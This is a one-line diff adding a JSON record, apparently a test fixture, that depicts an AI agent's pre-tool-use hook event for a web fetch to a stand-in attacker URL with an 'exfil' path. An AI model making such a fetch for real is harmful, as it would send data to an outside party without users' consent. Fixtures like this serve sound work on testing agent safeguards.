@@ -1,0 +1,1 @@
+{"hook_event_name":"PreToolUse","tool_name":"WebFetch","tool_input":{"url":"https://evil.example.com/exfil?x=1"},"tool_use_id":"toolu_n2"}
